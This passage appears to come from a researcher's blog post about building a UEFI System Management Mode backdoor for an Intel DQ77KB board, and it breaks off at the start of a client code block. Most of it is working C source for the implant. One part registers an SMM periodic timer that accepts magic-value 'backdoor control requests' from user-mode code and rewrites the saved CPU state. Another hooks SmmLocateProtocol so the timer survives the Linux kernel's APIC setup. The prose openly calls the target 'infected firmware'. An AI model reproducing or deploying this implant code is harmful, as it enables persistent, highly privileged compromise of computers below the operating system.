<pre style="height: 500px; overflow-x: auto; overflow-y: auto; white-space: pre; word-wrap: normal;"><span style="color: #3f7f59;">// periodic timer global vars</span>
EFI_HANDLE m_PeriodicTimerDispatchHandle = <span style="color: #7f0055; font-weight: bold;">NULL</span>;
EFI_SMM_PERIODIC_TIMER_DISPATCH2_PROTOCOL *m_PeriodicTimerDispatch = <span style="color: #7f0055; font-weight: bold;">NULL</span>;

<span style="color: #3f7f59;">/*</span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;SMM periodic timer registration context with Period and TickInterval values.</span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;Read EFI_SMM_PERIODIC_TIMER_DISPATCH2_PROTOCOL description information volume 4</span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;of Platform Initialization Specification for more information about them.</span>
<span style="color: #3f7f59;">*/</span>
EFI_SMM_PERIODIC_TIMER_REGISTER_CONTEXT m_PeriodicTimerDispatch2RegCtx = { 1000000, 640000 };

<span style="color: #3f7f59;">/*</span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;Structure that holds values of control registers from CPU saved state,</span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;this values are used in virtual to physical address translation code.</span>
<span style="color: #3f7f59;">*/</span>
<span style="color: #7f0055; font-weight: bold;">typedef</span> <span style="color: #7f0055; font-weight: bold;">struct</span> _CONTROL_REGS
{
    UINT64 Cr0, Cr3, Cr4;

} CONTROL_REGS,
*PCONTROL_REGS;

<span style="color: #3f7f59;">// macro to read register value from CPU execution state that was saved to SMRAM</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">define</span><span style="color: #7f0055;"> READ_SAVE_STATE</span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">_id_</span><span style="color: #7f0055;">,</span><span style="color: #7f0055;"> _var_</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;">                                                \</span>
<span style="color: #7f0055;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\</span>
<span style="color: #7f0055;">&nbsp;&nbsp;&nbsp;&nbsp;Status </span><span style="color: #7f0055;">=</span><span style="color: #7f0055;"> SmmCpu</span><span style="color: #7f0055;">-</span><span style="color: #7f0055;">&gt;</span><span style="color: #7f0055;">ReadSaveState</span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">SmmCpu</span><span style="color: #7f0055;">,</span><span style="color: #7f0055;">                                          \</span>
<span style="color: #7f0055;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #7f0055;">sizeof</span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">_var_</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;">,</span><span style="color: #7f0055;"> </span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">_id_</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;">,</span><span style="color: #7f0055;"> gSmst</span><span style="color: #7f0055;">-</span><span style="color: #7f0055;">&gt;</span><span style="color: #7f0055;">CurrentlyExecutingCpu</span><span style="color: #7f0055;">,</span><span style="color: #7f0055;"> </span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">PVOID</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;">&amp;</span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">_var_</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;">;</span><span style="color: #7f0055;">    \</span>
<span style="color: #7f0055;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\</span>
<span style="color: #7f0055;">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #7f0055;">if</span><span style="color: #7f0055;"> </span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">EFI_ERROR</span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">Status</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;">                                                          \</span>
<span style="color: #7f0055;">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #7f0055;">{</span><span style="color: #7f0055;">                                                                               \</span>
<span style="color: #7f0055;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DbgMsg</span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">__FILE__</span><span style="color: #7f0055;">,</span><span style="color: #7f0055;"> __LINE__</span><span style="color: #7f0055;">,</span><span style="color: #7f0055;"> </span><span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">ReadSaveState() fails: 0x</span><span style="color: #2a00ff;">%X</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span><span style="color: #7f0055;">,</span><span style="color: #7f0055;"> Status</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;">;</span><span style="color: #7f0055;">      \</span>
<span style="color: #7f0055;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto _end</span><span style="color: #7f0055;">;</span><span style="color: #7f0055;">                                                                  \</span>
<span style="color: #7f0055;">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #7f0055;">}</span>

<span style="color: #3f7f59;">// macro to modify register value of CPU execution state</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">define</span><span style="color: #7f0055;"> WRITE_SAVE_STATE</span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">_id_</span><span style="color: #7f0055;">,</span><span style="color: #7f0055;"> _var_</span><span style="color: #7f0055;">,</span><span style="color: #7f0055;"> _val_</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;">                                        \</span>
<span style="color: #7f0055;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\</span>
<span style="color: #7f0055;">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">_var_</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;"> </span><span style="color: #7f0055;">=</span><span style="color: #7f0055;"> </span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">UINT64</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">_val_</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;">;</span><span style="color: #7f0055;">                                                      \</span>
<span style="color: #7f0055;">&nbsp;&nbsp;&nbsp;&nbsp;Status </span><span style="color: #7f0055;">=</span><span style="color: #7f0055;"> SmmCpu</span><span style="color: #7f0055;">-</span><span style="color: #7f0055;">&gt;</span><span style="color: #7f0055;">WriteSaveState</span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">SmmCpu</span><span style="color: #7f0055;">,</span><span style="color: #7f0055;">                                         \</span>
<span style="color: #7f0055;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #7f0055;">sizeof</span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">_var_</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;">,</span><span style="color: #7f0055;"> </span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">_id_</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;">,</span><span style="color: #7f0055;"> gSmst</span><span style="color: #7f0055;">-</span><span style="color: #7f0055;">&gt;</span><span style="color: #7f0055;">CurrentlyExecutingCpu</span><span style="color: #7f0055;">,</span><span style="color: #7f0055;"> </span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">PVOID</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;">&amp;</span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">_var_</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;">;</span><span style="color: #7f0055;">    \</span>
<span style="color: #7f0055;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\</span>
<span style="color: #7f0055;">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #7f0055;">if</span><span style="color: #7f0055;"> </span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">EFI_ERROR</span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">Status</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;">                                                          \</span>
<span style="color: #7f0055;">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #7f0055;">{</span><span style="color: #7f0055;">                                                                               \</span>
<span style="color: #7f0055;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DbgMsg</span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">__FILE__</span><span style="color: #7f0055;">,</span><span style="color: #7f0055;"> __LINE__</span><span style="color: #7f0055;">,</span><span style="color: #7f0055;"> </span><span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">WriteSaveState() fails: 0x</span><span style="color: #2a00ff;">%X</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span><span style="color: #7f0055;">,</span><span style="color: #7f0055;"> Status</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;">;</span><span style="color: #7f0055;">     \</span>
<span style="color: #7f0055;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto _end</span><span style="color: #7f0055;">;</span><span style="color: #7f0055;">                                                                  \</span>
<span style="color: #7f0055;">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #7f0055;">}</span>

<span style="color: #7f0055;">#</span><span style="color: #7f0055;">define</span><span style="color: #7f0055;"> MAX_JUMP_SIZE 6</span>

EFI_STATUS EFIAPI PeriodicTimerDispatch2Handler(
    EFI_HANDLE DispatchHandle, <span style="color: #7f0055; font-weight: bold;">CONST</span> <span style="color: #7f0055; font-weight: bold;">VOID</span> *Context,
    <span style="color: #7f0055; font-weight: bold;">VOID</span> *CommBuffer, UINTN *CommBufferSize)
{
    EFI_STATUS Status = EFI_SUCCESS;   
    EFI_SMM_CPU_PROTOCOL *SmmCpu = <span style="color: #7f0055; font-weight: bold;">NULL</span>;    

    <span style="color: #3f7f59;">// obtain SMM CPU protocol </span>
    Status = gSmst-&gt;SmmLocateProtocol(&amp;gEfiSmmCpuProtocolGuid, <span style="color: #7f0055; font-weight: bold;">NULL</span>, (<span style="color: #7f0055; font-weight: bold;">PVOID</span> *)&amp;SmmCpu);
    <span style="color: #7f0055; font-weight: bold;">if</span> (Status == EFI_SUCCESS)
    {
        CONTROL_REGS ControlRegs;
        UINT64 Rax = 0, Rcx = 0, Rdx = 0, Rdi = 0, Rsi = 0, R8 = 0, R9 = 0;        

        READ_SAVE_STATE(EFI_SMM_SAVE_STATE_REGISTER_CR0, ControlRegs.Cr0);
        READ_SAVE_STATE(EFI_SMM_SAVE_STATE_REGISTER_CR3, ControlRegs.Cr3);
        READ_SAVE_STATE(EFI_SMM_SAVE_STATE_REGISTER_CR4, ControlRegs.Cr4);
        READ_SAVE_STATE(EFI_SMM_SAVE_STATE_REGISTER_RCX, Rcx); <span style="color: #3f7f59;">// user-mode instruction pointer</span>
        READ_SAVE_STATE(EFI_SMM_SAVE_STATE_REGISTER_RDI, Rdi); <span style="color: #3f7f59;">// 1-st param (code)</span>
        READ_SAVE_STATE(EFI_SMM_SAVE_STATE_REGISTER_RSI, Rsi); <span style="color: #3f7f59;">// 2-nd param (arg1)</span>
        READ_SAVE_STATE(EFI_SMM_SAVE_STATE_REGISTER_RDX, Rdx); <span style="color: #3f7f59;">// 3-rd param (arg2)</span>
        READ_SAVE_STATE(EFI_SMM_SAVE_STATE_REGISTER_R8, R8); <span style="color: #3f7f59;">// 1-st magic constant</span>
        READ_SAVE_STATE(EFI_SMM_SAVE_STATE_REGISTER_R9, R9); <span style="color: #3f7f59;">// 2-nd magic constant       </span>

        <span style="color: #3f7f59;">/* </span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Check for magic values that was set in smm_call(),</span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;see smm_call/smm_call.asm for more info.</span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span>
        <span style="color: #7f0055; font-weight: bold;">if</span> (R8 == BACKDOOR_SMM_CALL_R8_VAL &amp;&amp; R9 == BACKDOOR_SMM_CALL_R9_VAL)
        {            
            DbgMsg(
                __FILE__, __LINE__, 
                <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">smm_call(): CPU #</span><span style="color: #2a00ff;">%d</span><span style="color: #2a00ff;">, RDI = 0x</span><span style="color: #2a00ff;">%llx</span><span style="color: #2a00ff;">, RSI = 0x</span><span style="color: #2a00ff;">%llx</span><span style="color: #2a00ff;">, RDX = 0x</span><span style="color: #2a00ff;">%llx</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, 
                gSmst-&gt;CurrentlyExecutingCpu, Rdi, Rsi, Rdx
            );

            <span style="color: #3f7f59;">// handle backdoor control request</span>
            <span style="color: #3f7f59;">// ...</span>

            <span style="color: #3f7f59;">// set smm_call() return value</span>
            WRITE_SAVE_STATE(EFI_SMM_SAVE_STATE_REGISTER_RAX, Rax, Status);

            <span style="color: #3f7f59;">// let the code to exit from infinite loop</span>
            WRITE_SAVE_STATE(EFI_SMM_SAVE_STATE_REGISTER_RCX, Rcx, Rcx - MAX_JUMP_SIZE);
        }
    }
    <span style="color: #7f0055; font-weight: bold;">else</span>
    {
        DbgMsg(__FILE__, __LINE__, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">LocateProtocol() fails: 0x</span><span style="color: #2a00ff;">%X</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, Status);   
    }

_end:

    <span style="color: #7f0055; font-weight: bold;">return</span> EFI_SUCCESS;
}
<span style="color: #3f7f59;">//--------------------------------------------------------------------------------------</span>
EFI_STATUS PeriodicTimerDispatch2Register(EFI_HANDLE *DispatchHandle)
{
    EFI_STATUS Status = EFI_INVALID_PARAMETER;  

    <span style="color: #7f0055; font-weight: bold;">if</span> (m_PeriodicTimerDispatch)
    {
        <span style="color: #3f7f59;">// register periodic timer routine</span>
        Status = m_PeriodicTimerDispatch-&gt;Register(
            m_PeriodicTimerDispatch, 
            PeriodicTimerDispatch2Handler, 
            &amp;m_PeriodicTimerDispatch2RegCtx,
            DispatchHandle
        );
        <span style="color: #7f0055; font-weight: bold;">if</span> (Status == EFI_SUCCESS)
        {
            DbgMsg(
                __FILE__, __LINE__, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">SMM timer handler is at </span><span style="color: #2a00ff;">"</span>FPTR<span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, 
                PeriodicTimerDispatch2Handler
            );
        }
        <span style="color: #7f0055; font-weight: bold;">else</span>
        {
            DbgMsg(__FILE__, __LINE__, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">Register() fails: 0x</span><span style="color: #2a00ff;">%X</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, Status);
        }
    }    

    <span style="color: #7f0055; font-weight: bold;">return</span> Status;
}
<span style="color: #3f7f59;">//--------------------------------------------------------------------------------------</span>
EFI_STATUS PeriodicTimerDispatch2Unregister(EFI_HANDLE DispatchHandle)
{
    EFI_STATUS Status = EFI_INVALID_PARAMETER;  

    <span style="color: #7f0055; font-weight: bold;">if</span> (m_PeriodicTimerDispatch)
    {
        <span style="color: #3f7f59;">// unregister periodic timer routine</span>
        Status = m_PeriodicTimerDispatch-&gt;UnRegister(
            m_PeriodicTimerDispatch, 
            DispatchHandle
        );
        <span style="color: #7f0055; font-weight: bold;">if</span> (Status == EFI_SUCCESS)
        {
            DbgMsg(__FILE__, __LINE__, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">SMM timer handler unregistered</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>);
        }
        <span style="color: #7f0055; font-weight: bold;">else</span>
        {
            DbgMsg(__FILE__, __LINE__, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">Unregister() fails: 0x</span><span style="color: #2a00ff;">%X</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, Status);
        }
    }    

    <span style="color: #7f0055; font-weight: bold;">return</span> Status;
}
<span style="color: #3f7f59;">//--------------------------------------------------------------------------------------</span>
EFI_STATUS EFIAPI PeriodicTimerDispatch2ProtocolNotifyHandler(
    <span style="color: #7f0055; font-weight: bold;">CONST</span> EFI_GUID *Protocol, 
    <span style="color: #7f0055; font-weight: bold;">VOID</span> *Interface, 
    EFI_HANDLE Handle)
{
    EFI_STATUS Status = EFI_SUCCESS;   
    UINT64 *SmiTickInterval = <span style="color: #7f0055; font-weight: bold;">NULL</span>;

    <span style="color: #3f7f59;">// obtain target protocol</span>
    m_PeriodicTimerDispatch = 
        (EFI_SMM_PERIODIC_TIMER_DISPATCH2_PROTOCOL *)Interface;   

    <span style="color: #3f7f59;">// enable periodic timer SMI</span>
    PeriodicTimerDispatch2Register(m_PeriodicTimerDispatchHandle);       

    <span style="color: #7f0055; font-weight: bold;">return</span> EFI_SUCCESS;   
}
<span style="color: #3f7f59;">//--------------------------------------------------------------------------------------</span>
<span style="color: #7f0055; font-weight: bold;">VOID</span> BackdoorEntrySmm(<span style="color: #7f0055; font-weight: bold;">VOID</span>)
{
    <span style="color: #7f0055; font-weight: bold;">PVOID</span> Registration = <span style="color: #7f0055; font-weight: bold;">NULL</span>;

    <span style="color: #3f7f59;">// ... skipped ...</span>

    <span style="color: #3f7f59;">// register SMM protocol notification</span>
    EFI_STATUS Status = gSmst-&gt;SmmRegisterProtocolNotify(
        &amp;gEfiSmmPeriodicTimerDispatch2ProtocolGuid, 
        PeriodicTimerDispatch2ProtocolNotifyHandler, 
        &amp;Registration
    );
    <span style="color: #7f0055; font-weight: bold;">if</span> (Status == EFI_SUCCESS)
    {
        DbgMsg(
            __FILE__, __LINE__, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">SMM protocol notify handler is at </span><span style="color: #2a00ff;">"</span>FPTR<span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>,
            PeriodicTimerDispatch2ProtocolNotifyHandler
        );
    }
    <span style="color: #7f0055; font-weight: bold;">else</span>
    {
        DbgMsg(__FILE__, __LINE__, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">RegisterProtocolNotify() fails: 0x</span><span style="color: #2a00ff;">%X</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, Status);
    }

    <span style="color: #3f7f59;">// ... skipped ...</span>
}
</pre>
<br>
When I started my board with this code first time — I figured that 
periodic timer initializes and works fine, but it stops generating SMI 
during operating system (64-bit Linux) load. Such behaviour is easy 
explainable: during early boot OS kernel overrides APIC controller 
settings and apparently destroys our timer that was configured by 
infected firmware. Because there is no easy/documented ways to protect 
APIC configuration from changing by operating system — we need to find a
 way to re-initialize the timer from SMM code at more late stage of 
kernel initialization.<br>
<br>
I spent some time with hooking and monitoring of SMST functions and 
figured that during late stage of on-board hardware initialization my 
firmware code calls <span style="font-family: Courier New, Courier, monospace;">EFI_SMM_SYSTEM_TABLE2.SmmLocateProtocol()</span> function to find a protocol with GUID = <span style="font-family: Courier New, Courier, monospace;">3EF7500E-CF55-474F-8E7E009E0EACECD2</span> (<a href="https://www.google.com/search?q=3ef7500e+cf+55+474+f+8e+7e+00+9e+0e+ac+ec+d2">Google says</a> that it’s internal vendor name is <span style="font-family: Courier New, Courier, monospace;">AMI_USB_SMM_PROTOCOL_GUID</span>). Because APIC was already initialized by kernel at this point — I implemented backdoor code that hooks <span style="font-family: Courier New, Courier, monospace;">EFI_SMM_SYSTEM_TABLE2.SmmLocateProtocol()</span> and re-installs our periodic timer inside of hook handler function:<br>
<pre style="overflow-x: auto; overflow-y: auto; white-space: pre; word-wrap: normal;"><span style="color: #7f0055;">#</span><span style="color: #7f0055;">define</span><span style="color: #7f0055;"> AMI_USB_SMM_PROTOCOL_GUID </span><span style="color: #7f0055;">{</span><span style="color: #7f0055;"> 0x3ef7500e</span><span style="color: #7f0055;">,</span><span style="color: #7f0055;"> 0xcf55</span><span style="color: #7f0055;">,</span><span style="color: #7f0055;"> 0x474f</span><span style="color: #7f0055;">,</span><span style="color: #7f0055;"> \</span>
<span style="color: #7f0055;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #7f0055;">{</span><span style="color: #7f0055;"> 0x8e</span><span style="color: #7f0055;">,</span><span style="color: #7f0055;"> 0x7e</span><span style="color: #7f0055;">,</span><span style="color: #7f0055;"> 0x00</span><span style="color: #7f0055;">,</span><span style="color: #7f0055;"> 0x9e</span><span style="color: #7f0055;">,</span><span style="color: #7f0055;"> 0x0e</span><span style="color: #7f0055;">,</span><span style="color: #7f0055;"> 0xac</span><span style="color: #7f0055;">,</span><span style="color: #7f0055;"> 0xec</span><span style="color: #7f0055;">,</span><span style="color: #7f0055;"> 0xd2 </span><span style="color: #7f0055;">}</span><span style="color: #7f0055;">}</span>

EFI_LOCATE_PROTOCOL old_SmmLocateProtocol = <span style="color: #7f0055; font-weight: bold;">NULL</span>;

EFI_STATUS EFIAPI new_SmmLocateProtocol(
    EFI_GUID *Protocol,
    <span style="color: #7f0055; font-weight: bold;">VOID</span> *Registration,
    <span style="color: #7f0055; font-weight: bold;">VOID</span> **Interface)
{        
    EFI_GUID TargetGuid = AMI_USB_SMM_PROTOCOL_GUID;

    <span style="color: #3f7f59;">/*</span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Totally board-specific hack for Intel DQ77KB, SmmLocateProtocol</span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;with AMI_USB_SMM_PROTOCOL_GUID is being called during OS startup after</span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;APIC init, so, here we can register our SMI timer.</span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;*/</span>
    <span style="color: #7f0055; font-weight: bold;">if</span> (Protocol &amp;&amp; !<span style="color: #7f0055; font-weight: bold;">memcmp</span>(Protocol, &amp;TargetGuid, <span style="color: #7f0055; font-weight: bold;">sizeof</span>(TargetGuid)))
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__<span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">()</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>);

        <span style="color: #7f0055; font-weight: bold;">if</span> (m_PeriodicTimerDispatchHandle)
        {
            <span style="color: #3f7f59;">// unregister previously registered timer</span>
            PeriodicTimerDispatch2Unregister(m_PeriodicTimerDispatchHandle);
            m_PeriodicTimerDispatchHandle = <span style="color: #7f0055; font-weight: bold;">NULL</span>;
        }

        <span style="color: #3f7f59;">// enable periodic timer SMI again</span>
        PeriodicTimerDispatch2Register(&amp;m_PeriodicTimerDispatchHandle);

        <span style="color: #3f7f59;">// remove the hook</span>
        gSmst-&gt;SmmLocateProtocol = old_SmmLocateProtocol;       
    }    

    <span style="color: #3f7f59;">// call original function</span>
    <span style="color: #7f0055; font-weight: bold;">return</span> old_SmmLocateProtocol(Protocol, Registration, Interface);
}
<span style="color: #3f7f59;">//--------------------------------------------------------------------------------------</span>
<span style="color: #7f0055; font-weight: bold;">VOID</span> BackdoorEntrySmm(<span style="color: #7f0055; font-weight: bold;">VOID</span>)
{
    <span style="color: #7f0055; font-weight: bold;">PVOID</span> Registration = <span style="color: #7f0055; font-weight: bold;">NULL</span>;

    <span style="color: #3f7f59;">// ... skipped ...</span>

    <span style="color: #3f7f59;">// hook SmmLocateProtocol() SMST function to execute backdoor code during OS startup</span>
    old_SmmLocateProtocol = gSmst-&gt;SmmLocateProtocol;
    gSmst-&gt;SmmLocateProtocol = new_SmmLocateProtocol;

    <span style="color: #3f7f59;">// ... skipped ...</span>
}
</pre>
<br>
Of course, such dirty and totally board specific hack is not very good 
for backdoor reliability, but it has no impact on platform stability and
 it’s code is not complicated at all. If you have any ideas how to solve
 this APIC problem in more portable way and let the timer settings to 
survive OS load — please let me know :)<br>
<br>
Client code for this communication method is written in C and ASM, before jump to infinite loop it calls <span style="font-family: Courier New, Courier, monospace;"><a href="http://man7.org/linux/man-pages/man2/sched_setaffinity.2.html">sched_setaffinity</a>()</span> Linux function to be sure that scheduler will run our loop on the first CPU:<br>
<pre style="overflow-x: auto; overflow-y: auto; white-space: pre; word-wrap: normal;"><span style="color: #7f0055;">#</span><span style="color: #7f0055;">define</span><span style="color: #7f0055;"> _GNU_SOURCE</span>

